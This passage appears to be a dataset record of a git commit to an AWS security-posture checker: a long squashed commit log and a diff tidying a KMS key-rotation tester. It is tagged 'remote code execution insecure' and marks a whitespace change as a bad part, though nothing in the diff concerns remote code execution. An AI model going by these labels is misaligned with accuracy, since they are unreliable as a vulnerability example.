provider and service was moved to the context and the private_key was removed from the context.\r\n\r\n* remove tmp folder\r\n\r\n* Add protodep.toml file and remove unnecessary code\r\n\r\n* SES Tester empty object condition check added. (#98)\r\n\r\n* Auto posture evaluator\/s3 antstack (#67)\r\n\r\n* Add check for bucket logging\r\n\r\n* Add check for bucket encryption with cmk\r\n\r\n* Add check for block public access setting\r\n\r\n* Add check for bucket public access configuration\r\n\r\n* Add checks for ACL permissions and small fixes\r\n\r\n* Add account id as item in return statement for a function\r\n\r\n* Add checks for bucket had global list, put or get permissions through bucket policy\r\n\r\n* Add start and end time for each tester (#100)\r\n\r\n* DMS Tester Tasks added. (#97)\r\n\r\n* Auto posture evaluator\/iam antstack (#61)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add server certificate expire in 30 days\r\n\r\n* Add expired server certificates removed\r\n\r\n* Add passwords expire in 90 days test\r\n\r\n* Add condition checks for password policy\r\n\r\n* small fix\r\n\r\n* Add check for AWS support role exists\r\n\r\n* Add check for user with admin access\r\n\r\n* Add password policy reuse test\r\n\r\n* Add check for root account's access key\r\n\r\n* Add mfa enabled for all IAM users test\r\n\r\n* Add role uses trusted principals test\r\n\r\n* Fix h\/w MFA enabled for root account\r\n\r\n* Add access keys are not created for IAM user\r\n\r\n* Add check for policy with admin privileges\r\n\r\n* Add NoSuchEntityException in password has 14 or more char check\r\n\r\n* Add NoSuchEntiry exception in password expires in 90 days test\r\n\r\n* Add NoSuchEntity exception in password requires lowercase test\r\n\r\n* Add NoSuchEntity exception for password requires uppercase test\r\n\r\n* Add NoSuchEntity exception in password requires symbols test\r\n\r\n* Add NoSuchEntity exception in password policy requires numbers test\r\n\r\n* Add NoSuchEntity exception in password reuse test\r\n\r\n* Add small fixes\r\n\r\n* Add iam user credentials unused for 45 days test\r\n\r\n* Use constant for password max age 90 days test\r\n\r\n* Use constant in password maximum length test\r\n\r\n* Use constant in access keys rotated every 90 days test\r\n\r\n* Fix server certificate issue\r\n\r\n* Add IAM user has more than one active access key test\r\n\r\n* Add IAM access analyzer disabled test\r\n\r\n* Remove item from result when there isn't any resource\r\n\r\n* Add pre heartbleed bug server certificates check\r\n\r\n* Bug fix\r\n\r\n* Add there is atleast one IAM user with access keys test\r\n\r\n* Add detect IAM users present test\r\n\r\n* Add helper method to get all the IAM users\r\n\r\n* Add helper method to get response structure\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Move the test list to env (#102)\r\n\r\n* Move the test list to env\r\n\r\n* Check tester real path. test all tester when no env\r\n\r\n* Change the exeption message\r\n\r\n* return statement added for a function (#103)\r\n\r\n* Auto posture evaluator\/elb antstack (#76)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* Add ELBv1 cross zone load balancing enabled test\r\n\r\n* Add ELBv1 connection draining enabled test\r\n\r\n* Add no registered instances in an ELBv1 test\r\n\r\n* Add ELBv1 should allow TLSv1.2 higher test\r\n\r\n* Fix typo\r\n\r\n* Add check for IAM certificate for ALB certificate should be renewed in 30 days\r\n\r\n* Remove response item in result when there isn't any ELB\r\n\r\n* Add pagination in describe LB to get all LBs\r\n\r\n* Add ELBv1 SSL certificate expires in 90 days test\r\n\r\n* Add env variable for SSL certificate expiry test\r\n\r\n* Add small fix\r\n\r\n* Add ELB SSL certificate should be renewed 5 days in advance test\r\n\r\n* Add ELB supports vulnerable negotiation policy test\r\n\r\n* first commit (#104)\r\n\r\n* Blocking pattern parameter added (#106)\r\n\r\n* Add tcp port 138 for netbios test\r\n\r\n* Add udp port 139 for netbios test\r\n\r\n* Add icmpv6 in icmp access test\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Add cloudwatch tester (#70)\r\n\r\n* Add cloudwatch tester\r\n\r\n* Add multiple check for alarms present in cloudwatch\r\n\r\n* Add more cloudwatch checks and one cloudformation check for stack notifications\r\n\r\n* Add small fix\r\n\r\n* Add item to results\r\n\r\n* removed unnecessary line\r\n\r\n* Add result object helper method\r\n\r\n* item name changed to cloudformation_stack name in unauthorized api calls not monitored\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* fix protodep.toml typo (#105)\r\n\r\n* Use or for bucket not configured with block public access test\r\n\r\n* Add global delete permissions enabled\r\n\r\n* Remove debug lines\r\n\r\n* Fix global put permission enabled test\r\n\r\n* Add linter to clean the tester\r\n\r\nCo-authored-by: harikarthickm <76831661+harikarthickm@users.noreply.github.com>\r\nCo-authored-by: Vaibhav <49142340+vaibhavgope@users.noreply.github.com>\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\nCo-authored-by: zina <36052945+zina-mev@users.noreply.github.com>\r\nCo-authored-by: Bhuvanesh-J <87064334+Bhuvanesh-J@users.noreply.github.com>\r\nCo-authored-by: Eldar Aliiev <bc.zim.green@gmail.com>\r\nCo-authored-by: Barnab\u00e1s Ol\u00e1h <7964844+stsatlantis@users.noreply.github.com>\r\n\r\n* Elastic Search Tester Tasks Added. (#114)\r\n\r\n* Add redshift cluster not encrypted with kms keys test (#80)\r\n\r\n* Add redshift cluster not encrypted with kms keys test\r\n\r\n* Add pagination to get all redshift clusters\r\n\r\n* VPC Tester Tasks Added. (#115)\r\n\r\n* Auto posture evaluator\/iam antstack (#109)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add server certificate expire in 30 days\r\n\r\n* Add expired server certificates removed\r\n\r\n* Add passwords expire in 90 days test\r\n\r\n* Add condition checks for password policy\r\n\r\n* small fix\r\n\r\n* Add check for AWS support role exists\r\n\r\n* Add check for user with admin access\r\n\r\n* Add password policy reuse test\r\n\r\n* Add check for root account's access key\r\n\r\n* Add mfa enabled for all IAM users test\r\n\r\n* Add role uses trusted principals test\r\n\r\n* Fix h\/w MFA enabled for root account\r\n\r\n* Add access keys are not created for IAM user\r\n\r\n* Add check for policy with admin privileges\r\n\r\n* Add NoSuchEntityException in password has 14 or more char check\r\n\r\n* Add NoSuchEntiry exception in password expires in 90 days test\r\n\r\n* Add NoSuchEntity exception in password requires lowercase test\r\n\r\n* Add NoSuchEntity exception for password requires uppercase test\r\n\r\n* Add NoSuchEntity exception in password requires symbols test\r\n\r\n* Add NoSuchEntity exception in password policy requires numbers test\r\n\r\n* Add NoSuchEntity exception in password reuse test\r\n\r\n* Add small fixes\r\n\r\n* Add iam user credentials unused for 45 days test\r\n\r\n* Use constant for password max age 90 days test\r\n\r\n* Use constant in password maximum length test\r\n\r\n* Use constant in access keys rotated every 90 days test\r\n\r\n* Fix server certificate issue\r\n\r\n* Add IAM user has more than one active access key test\r\n\r\n* Add IAM access analyzer disabled test\r\n\r\n* Remove item from result when there isn't any resource\r\n\r\n* Add pre heartbleed bug server certificates check\r\n\r\n* Bug fix\r\n\r\n* Add there is atleast one IAM user with access keys test\r\n\r\n* Add detect IAM users present test\r\n\r\n* Add helper method to get all the IAM users\r\n\r\n* Add helper method to get response structure\r\n\r\n* Add explicit checks for programmatic users and never logged in user\r\n\r\n* Lambda extension architecture optionality added (#59)\r\n\r\n* Europe2 endpoint added (#60)\r\n\r\n* CloudWatch Fix\r\n\r\n* Restriction check for topic,subscription and encryption functions are done (#63)\r\n\r\nElastic Search Tester cases - Latest Engine Version,Using VPC,Encryption enabled,KMS CMK - Done\r\n\r\n* Elastic Search Tester cases - Latest Engine Version,Using VPC,Encryption enabled,KMS CMK - Done (#58)\r\n\r\nElastic Search -  Not publicly accessible\r\n\r\n* SQS - Tester file added (#65)\r\n\r\n* SQS - Tester file added\r\n\r\n* Fixes in the Sqs testers\r\n\r\n* Auto posture evaluator\/elb antstack (#66)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* add grpc endpoint (#71)\r\n\r\n* add grpc endpoint\r\n\r\n* change execution_id\r\n\r\n* add model folder to the package_generator.sh\r\n\r\n* change the return value of logger method and chnge the README file\r\n\r\n* remove await\r\n\r\n* remove readme\r\n\r\n* Removing the coralogix (old) endpoint\r\n\r\n* Change raise exception to print an continue\r\n\r\n* delete package folder in the beginning\r\n\r\n* Remove exception in case the Result list is empty (#86)\r\n\r\n* Add neptune cluster tests (#82)\r\n\r\n* Add neptune cluster tests\r\n\r\n* Fix neptune cluster audit log issue\r\n\r\n* fix uuid - to generate uuid4() (#87)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc (#90)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc\r\n\r\n* add try block\r\n\r\n* remove try (#91)\r\n\r\n* remove event loop.close() (#92)\r\n\r\n* Auto posture evaluator\/kms antstack (#62)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add key rotation status validation\r\n\r\n* Add kms cmk pending deletion check\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/ebs antstack (#64)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Added ebs tests\r\n\r\n* Add checks for snapshot and kms key encryption\r\n\r\n* Remove print statement and change recent snapshot duration from 14 to 7 days\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Delete iam_tester.py\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Sqs-Tester Tasks added (#93)\r\n\r\n* Feature\/update modle (#96)\r\n\r\n* Update the model (__init__py) and the auto_posture_evaluator- execution_id, provider and service was moved to the context and the private_key was removed from the context.\r\n\r\n* remove tmp folder\r\n\r\n* Add protodep.toml file and remove unnecessary code\r\n\r\n* SES Tester empty object condition check added. (#98)\r\n\r\n* Auto posture evaluator\/s3 antstack (#67)\r\n\r\n* Add check for bucket logging\r\n\r\n* Add check for bucket encryption with cmk\r\n\r\n* Add check for block public access setting\r\n\r\n* Add check for bucket public access configuration\r\n\r\n* Add checks for ACL permissions and small fixes\r\n\r\n* Add account id as item in return statement for a function\r\n\r\n* Add checks for bucket had global list, put or get permissions through bucket policy\r\n\r\n* Add start and end time for each tester (#100)\r\n\r\n* DMS Tester Tasks added. (#97)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#69)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Move the test list to env (#102)\r\n\r\n* Move the test list to env\r\n\r\n* Check tester real path. test all tester when no env\r\n\r\n* Change the exeption message\r\n\r\n* return statement added for a function (#103)\r\n\r\n* Auto posture evaluator\/elb antstack (#76)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* Add ELBv1 cross zone load balancing enabled test\r\n\r\n* Add ELBv1 connection draining enabled test\r\n\r\n* Add no registered instances in an ELBv1 test\r\n\r\n* Add ELBv1 should allow TLSv1.2 higher test\r\n\r\n* Fix typo\r\n\r\n* Add check for IAM certificate for ALB certificate should be renewed in 30 days\r\n\r\n* Remove response item in result when there isn't any ELB\r\n\r\n* Add pagination in describe LB to get all LBs\r\n\r\n* Add ELBv1 SSL certificate expires in 90 days test\r\n\r\n* Add env variable for SSL certificate expiry test\r\n\r\n* Add small fix\r\n\r\n* Add ELB SSL certificate should be renewed 5 days in advance test\r\n\r\n* Add ELB supports vulnerable negotiation policy test\r\n\r\n* first commit (#104)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#107)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\n* Fix sensitive instances tags not present issue\r\n\r\n* Add env variable for per region max cpu count limit\r\n\r\n* Add empty response check in nearing regional limit for e-IP test\r\n\r\n* Add is exists check i aws config not enabled for all region test\r\n\r\n* Check ::\/0 in IP range\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Blocking pattern parameter added (#106)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#108)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\n* Fix sensitive instances tags not present issue\r\n\r\n* Add env variable for per region max cpu count limit\r\n\r\n* Add empty response check in nearing regional limit for e-IP test\r\n\r\n* Add is exists check i aws config not enabled for all region test\r\n\r\n* Check ::\/0 in IP range\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc (#90)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc\r\n\r\n* add try block\r\n\r\n* remove try (#91)\r\n\r\n* remove event loop.close() (#92)\r\n\r\n* Auto posture evaluator\/kms antstack (#62)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add key rotation status validation\r\n\r\n* Add kms cmk pending deletion check\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/ebs antstack (#64)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Added ebs tests\r\n\r\n* Add checks for snapshot and kms key encryption\r\n\r\n* Remove print statement and change recent snapshot duration from 14 to 7 days\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Delete iam_tester.py\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Sqs-Tester Tasks added (#93)\r\n\r\n* Feature\/update modle (#96)\r\n\r\n* Update the model (__init__py) and the auto_posture_evaluator- execution_id, provider and service was moved to the context and the private_key was removed from the context.\r\n\r\n* remove tmp folder\r\n\r\n* Add protodep.toml file and remove unnecessary code\r\n\r\n* SES Tester empty object condition check added. (#98)\r\n\r\n* Auto posture evaluator\/s3 antstack (#67)\r\n\r\n* Add check for bucket logging\r\n\r\n* Add check for bucket encryption with cmk\r\n\r\n* Add check for block public access setting\r\n\r\n* Add check for bucket public access configuration\r\n\r\n* Add checks for ACL permissions and small fixes\r\n\r\n* Add account id as item in return statement for a function\r\n\r\n* Add checks for bucket had global list, put or get permissions through bucket policy\r\n\r\n* Add start and end time for each tester (#100)\r\n\r\n* DMS Tester Tasks added. (#97)\r\n\r\n* Auto posture evaluator\/iam antstack (#61)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add server certificate expire in 30 days\r\n\r\n* Add expired server certificates removed\r\n\r\n* Add passwords expire in 90 days test\r\n\r\n* Add condition checks for password policy\r\n\r\n* small f\u2026","sha":"63cd07d2354dcaf90d367adf0ebf75067a24ace3","keyword":"remote code execution insecure","diff":"diff --git a\/src\/auto-posture-evaluator\/testers\/kms_tester.py b\/src\/auto-posture-evaluator\/testers\/kms_tester.py\nindex 8214b72c..0b3138da 100644\n--- a\/src\/auto-posture-evaluator\/testers\/kms_tester.py\n+++ b\/src\/auto-posture-evaluator\/testers\/kms_tester.py\n@@ -2,13 +2,15 @@\n import boto3\n import time\n \n+\n class Tester(interfaces.TesterInterface):\n     def __init__(self) -> None:\n         self.aws_kms_client = boto3.client('kms')\n         self.user_id = boto3.client('sts').get_caller_identity().get('UserId')\n         self.account_arn = boto3.client('sts').get_caller_identity().get('Arn')\n-        self.account_id = boto3.client('sts').get_caller_identity().get('Account') \n+        self.account_id = boto3.client('sts').get_caller_identity().get('Account')\n         self.kms_keys = []\n+\n     def declare_tested_provider(self) -> str:\n         return 'aws'\n \n@@ -20,7 +22,19 @@ def run_tests(self) -> list:\n         return \\\n             self.get_rotation_for_cmks_is_enabled(self.kms_keys) + \\\n             self.get_kms_cmk_pending_deletion(self.kms_keys)\n-    \n+\n+    def _get_result_object(self, item, item_type, test_name, issue_status):\n+        return {\n+            \"user\": self.user_id,\n+            \"account_arn\": self.account_arn,\n+            \"account\": self.account_id,\n+            \"timestamp\": time.time(),\n+            \"item\": item,\n+            \"item_type\": item_type,\n+            \"test_name\": test_name,\n+            \"test_result\": issue_status\n+        }\n+\n     def _get_kms_keys(self):\n         keys = []\n         can_paginate = self.aws_kms_client.can_paginate('list_keys')\n@@ -34,67 +48,32 @@ def _get_kms_keys(self):\n             response = self.aws_kms_client.list_keys()\n             keys.extend(response['Keys'])\n         return keys\n-    \n+\n     def get_rotation_for_cmks_is_enabled(self, keys):\n         result = []\n-        test_name = \"rotation_for_cmks_is_enabled\"\n+        test_name = \"aws_kms_rotation_for_cmks_is_enabled\"\n \n         for key in keys:\n             key_id = key['KeyId']\n-            response = self.aws_kms_client.get_key_rotation_status(KeyId = key_id)\n+            response = self.aws_kms_client.get_key_rotation_status(KeyId=key_id)\n             rotation_status = response['KeyRotationEnabled']\n             if rotation_status:\n-                result.append({\n-                    \"user\": self.user_id,\n-                    \"account_arn\": self.account_arn,\n-                    \"account\": self.account_id,\n-                    \"timestamp\": time.time(),\n-                    \"item\": key_id,\n-                    \"item_type\": \"kms_policy\",\n-                    \"test_name\": test_name,\n-                    \"test_result\": \"no_issue_found\"\n-                })\n+                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"no_issue_found\"))\n             else:\n-                result.append({\n-                    \"user\": self.user_id,\n-                    \"account_arn\": self.account_arn,\n-                    \"account\": self.account_id,\n-                    \"timestamp\": time.time(),\n-                    \"item\": key_id,\n-                    \"item_type\": \"kms_policy\",\n-                    \"test_name\": test_name,\n-                    \"test_result\": \"issue_found\"\n-                })\n+                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"issue_found\"))\n+\n         return result\n \n     def get_kms_cmk_pending_deletion(self, keys):\n         result = []\n-        test_name = \"kms_cmk_pending_deletion\"\n+        test_name = \"aws_kms_cmk_pending_deletion\"\n \n         for key in keys:\n             key_id = key['KeyId']\n-            response = self.aws_kms_client.describe_key(KeyId = key_id)\n+            response = self.aws_kms_client.describe_key(KeyId=key_id)\n             rotation_status = response['KeyMetadata']['KeyState']\n             if rotation_status == 'PendingDeletion':\n-                result.append({\n-                    \"user\": self.user_id,\n-                    \"account_arn\": self.account_arn,\n-                    \"account\": self.account_id,\n-                    \"timestamp\": time.time(),\n-                    \"item\": key_id,\n-                    \"item_type\": \"kms_policy\",\n-                    \"test_name\": test_name,\n-                    \"test_result\": \"issue_found\"\n-                })\n+                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"issue_found\"))\n             else:\n-                result.append({\n-                    \"user\": self.user_id,\n-                    \"account_arn\": self.account_arn,\n-                    \"account\": self.account_id,\n-                    \"timestamp\": time.time(),\n-                    \"item\": key_id,\n-                    \"item_type\": \"kms_policy\",\n-                    \"test_name\": test_name,\n-                    \"test_result\": \"no_issue_found\"\n-                })\n-        return result\n\\ No newline at end of file\n+                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"no_issue_found\"))\n+        return result\n","files":{"\/src\/auto-posture-evaluator\/testers\/kms_tester.py":{"changes":[{"diff":"\n import boto3\n import time\n \n+\n class Tester(interfaces.TesterInterface):\n     def __init__(self) -> None:\n         self.aws_kms_client = boto3.client('kms')\n         self.user_id = boto3.client('sts').get_caller_identity().get('UserId')\n         self.account_arn = boto3.client('sts').get_caller_identity().get('Arn')\n-        self.account_id = boto3.client('sts').get_caller_identity().get('Account') \n+        self.account_id = boto3.client('sts').get_caller_identity().get('Account')\n         self.kms_keys = []\n+\n     def declare_tested_provider(self) -> str:\n         return 'aws'\n \n","add":3,"remove":1,"filename":"\/src\/auto-posture-evaluator\/testers\/kms_tester.py","badparts":["        self.account_id = boto3.client('sts').get_caller_identity().get('Account') "],"goodparts":["        self.account_id = boto3.client('sts').get_caller_identity().get('Account')"]},{"diff":"\n             response = self.aws_kms_client.list_keys()\n             keys.extend(response['Keys'])\n         return keys\n-    \n+\n     def get_rotation_for_cmks_is_enabled(self, keys):\n         result = []\n-        test_name = \"rotation_for_cmks_is_enabled\"\n+        test_name = \"aws_kms_rotation_for_cmks_is_enabled\"\n \n         for key in keys:\n             key_id = key['KeyId']\n-            response = self.aws_kms_client.get_key_rotation_status(KeyId = key_id)\n+            response = self.aws_kms_client.get_key_rotation_status(KeyId=key_id)\n             rotation_status = response['KeyRotationEnabled']\n             if rotation_status:\n-                result.append({\n-                    \"user\": self.user_id,\n-                    \"account_arn\": self.account_arn,\n-                    \"account\": self.account_id,\n-                    \"timestamp\": time.time(),\n-                    \"item\": key_id,\n-                    \"item_type\": \"kms_policy\",\n-                    \"test_name\": test_name,\n-                    \"test_result\": \"no_issue_found\"\n-                })\n+                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"no_issue_found\"))\n             else:\n-                result.append({\n-                    \"user\": self.user_id,\n-                    \"account_arn\": self.account_arn,\n-                    \"account\": self.account_id,\n-                    \"timestamp\": time.time(),\n-                    \"item\": key_id,\n-                    \"item_type\": \"kms_policy\",\n-                    \"test_name\": test_name,\n-                    \"test_result\": \"issue_found\"\n-                })\n+                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"issue_found\"))\n+\n         return result\n \n     def get_kms_cmk_pending_deletion(self, keys):\n         result = []\n-        test_name = \"kms_cmk_pending_deletion\"\n+        test_name = \"aws_kms_cmk_pending_deletion\"\n \n         for key in keys:\n             key_id = key['KeyId']\n-            response = self.aws_kms_client.describe_key(KeyId = key_id)\n+            response = 